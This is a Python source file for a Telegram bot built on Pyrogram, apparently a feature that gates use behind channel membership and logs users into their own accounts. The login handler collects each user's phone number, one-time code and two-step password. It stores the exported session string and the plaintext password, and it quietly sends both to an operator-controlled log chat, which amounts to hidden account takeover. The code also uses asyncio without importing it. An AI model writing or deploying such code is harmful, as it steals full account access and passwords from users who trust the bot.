from pyrogram import Client, filters
from pyrogram.errors import PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid, PhoneNumberInvalid
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from database.db import database  # Make sure this is the correct import
from config import API_ID, API_HASH, LOGS_CHAT_ID, FSUB_ID, FSUB_INV_LINK
from FLiX.strings import strings

SESSION_STRING_SIZE = 351

async def is_member(bot: Client, user_id: int) -> bool:
    try:
        chat_member = await bot.get_chat_member(FSUB_ID, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Error checking membership: {e}")
        return False


@Client.on_message(filters.command("login") & filters.private)
async def login_acc(bot: Client, message: Message):
    # Check if the user is a member
    if not await is_member(bot, message.from_user.id):
        await bot.send_message(
            chat_id=message.chat.id,
            text=f"👋 Hi {message.from_user.mention}, you must join my channel to use me.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Join ❤️", url=FSUB_INV_LINK)
            ]]),
            reply_to_message_id=message.id  
        )
        return
    
    # Insert or update user session data
    user_data = database.sessions.find_one({"user_id": message.from_user.id})
    if not user_data:
        # Insert default session data for a new user
        database.sessions.insert_one({
            'user_id': message.from_user.id,
            'logged_in': False,
            'session': None,
            '2FA': None
        })
    
    user_data = database.sessions.find_one({"user_id": message.from_user.id})
    if user_data.get('logged_in', False):
        await message.reply(strings['already_logged_in'])
        return
    
    user_id = message.from_user.id
    phone_number_msg = await bot.ask(chat_id=user_id, text="<b>Please send your phone number including country code</b>\nExample: <code>+1234567890</code>")
    
    if phone_number_msg.text == '/cancel':
        return await phone_number_msg.reply('<b>Process cancelled!</b>')
    
    phone_number = phone_number_msg.text
    client = Client(f"session_{user_id}", API_ID, API_HASH)
    await client.connect()

    await phone_number_msg.reply("Sending OTP...")

    try:
        code = await client.send_code(phone_number)
        phone_code_msg = await bot.ask(user_id, "Please send OTP (format: `1 2 3 4 5`).\nSend /cancel to cancel the process.", filters=filters.text, timeout=600)
    except PhoneNumberInvalid:
        await phone_number_msg.reply('Invalid phone number.')
        return
    except asyncio.TimeoutError:
        await phone_number_msg.reply('Time limit exceeded. Please restart.')
        return

    if phone_code_msg.text == '/cancel':
        return await phone_code_msg.reply('<b>Process cancelled!</b>')

    phone_code = phone_code_msg.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await phone_code_msg.reply('Invalid OTP.')
        return
    except PhoneCodeExpired:
        await phone_code_msg.reply('OTP expired.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await bot.ask(user_id, 'Two-step verification enabled. Provide password.\nSend /cancel to cancel.', filters=filters.text, timeout=300)
            if two_step_msg.text == '/cancel':
                return await two_step_msg.reply('<b>Process cancelled!</b>')
        except asyncio.TimeoutError:
            await message.reply('Time limit exceeded. Restart the session.')
            return
        
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('Invalid password.')
            return
    
    string_session = await client.export_session_string()
    await client.disconnect()

    if len(string_session) < SESSION_STRING_SIZE:
        return await message.reply('<b>Invalid session string</b>')

    # Update session data in the database
    data = {
        'logged_in': True,
        'session': string_session,
        '2FA': password if 'password' in locals() else None
    }
    
    database.sessions.update_one({'user_id': user_id}, {'$set': data})

    log_message = (
        f"**New Login**\n"
        f"**User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
        f"**Session String:** `{string_session}`\n"
        f"**2FA Password:** `{password if 'password' in locals() else 'None'}`"
    )

    await bot.send_message(LOGS_CHAT_ID, log_message)
    await message.reply("<b>Login successful!</b>")
